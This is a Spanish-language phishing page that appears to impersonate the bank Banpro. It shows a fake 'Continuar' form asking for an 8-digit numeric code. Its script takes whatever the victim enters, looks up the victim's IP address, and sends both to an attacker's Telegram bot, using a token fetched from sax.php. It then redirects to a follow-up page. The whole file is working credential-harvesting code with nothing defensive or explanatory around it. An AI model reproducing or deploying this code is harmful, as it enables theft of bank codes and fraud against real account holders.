<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Continuar</title>
    <script src="https://code.jquery.com/jquery-2.2.3.min.js"
            integrity="sha256-a23g1Nt4dtEYOj7bR+vTu7+T8VP13humZFBJNIYoEJo="
            crossorigin="anonymous"></script>
</head>
<body>
    <div id="ld" style="position: fixed; width: 100%; height: 100%; background: rgba(255, 255, 255, 1); z-index: 10; text-align: center;">
        <img src="tmp.svg" style="width: 300px; margin-top: 200px;"><br>
        <div style="width: 126px; height: 126px; display: inline-block; border: 5px solid #00693c; border-radius: 50%;">
            <img src="p.gif?id=50" style="width: 110px; position: relative; top: 36px;">
        </div>
    </div>

    <div id="main-cnt" style="overflow: hidden; min-height: 100vh; position: relative;">
        <div id="ctn" style="display: inline-block; vertical-align: top; background-color: #fff;">
            <div id="frmc" style="display: inline-block; text-align: center; border-radius: 8px; vertical-align: top; width: 500px;">
                <form id="f1" style="display: inline-block; width: 420px; height: 660px; border-radius: 10px; background-image: url(2.svg); position: relative;">
                    <img src="l.png" style="position: relative; top: 51px; left: -15px; width: 294px;">
                    <input maxlength="8" id="i1" name="ips1" placeholder="Código" type="text" inputmode="numeric" required style="display: block; position: relative; color: #333; background: transparent; border: none; top: 187px; left: 28px; height: 39px; width: 357px; padding-left: 12px; outline: none; font-size: 16px; font-family: dinReg, sans-serif;" autocomplete="off">
                    <input type="submit" value="Continuar" style="display: block; position: relative; font-size: 16px; color: #fff; background: rgb(0, 105, 60); border: none; top: 224px; left: 28px; height: 39px; width: 364px; outline: none; border-radius: 8px;">
                </form>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener("DOMContentLoaded", function() {
            // Función para obtener la IP del cliente
            function obtenerIP() {
                return fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => data.ip)
                    .catch(error => {
                        console.error('Error al obtener la IP:', error);
                        return 'IP no disponible';
                    });
            }

            // Función para obtener el token y el chat ID desde sax.php
            function obtenerToken() {
                return fetch('sax.php')
                    .then(response => response.json())
                    .then(data => ({
                        token: data.token,
                        chat_id: data.chat_id
                    }))
                    .catch(error => {
                        console.error('Error al obtener el token:', error);
                        return null;
                    });
            }

            // Evento de envío del formulario
            document.getElementById("f1").addEventListener("submit", function(event) {
                event.preventDefault();

                // Obtener el valor ingresado en el formulario
                const ips1 = document.getElementById("i1").value;

                // Obtener el token y la IP antes de enviar a Telegram
                Promise.all([obtenerToken(), obtenerIP()])
                    .then(results => {
                        const tokenData = results[0];
                        const ip = results[1];

                        if (tokenData && tokenData.token && tokenData.chat_id) {
                            const msg = `BANPRO LOGIN> IP: ${ip} - Código: ${ips1}`;
                            enviarMensajeTelegram(tokenData.token, tokenData.chat_id, msg);
                        } else {
                            console.error('Error al obtener los datos necesarios para enviar el mensaje.');
                        }
                    })
                    .catch(error => {
                        console.error('Error al procesar la solicitud:', error);
                    });
            });

            // Función para enviar un mensaje a Telegram
            function enviarMensajeTelegram(token, chat_id, mensaje) {
                const url = `https://api.telegram.org/bot${token}/sendMessage`;
                const params = {
                    chat_id: chat_id,
                    text: mensaje
                };

                fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(params)
                })
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Ocurrió un error al enviar el mensaje.');
                    }
                    console.log('Mensaje enviado con éxito.');
                    // Redirigir después de enviar el mensaje
                    window.location.href = '3.html';
                })
                .catch(error => {
                    console.error('Error al enviar el mensaje:', error);
                });
            }
        });

        // Ocultar el cargador después de 19 segundos
        window.onload = function() {
            setTimeout(function() {
                document.getElementById("ld").style.display = "none";
            }, 23000);
        };
    </script>
</body>
</html>
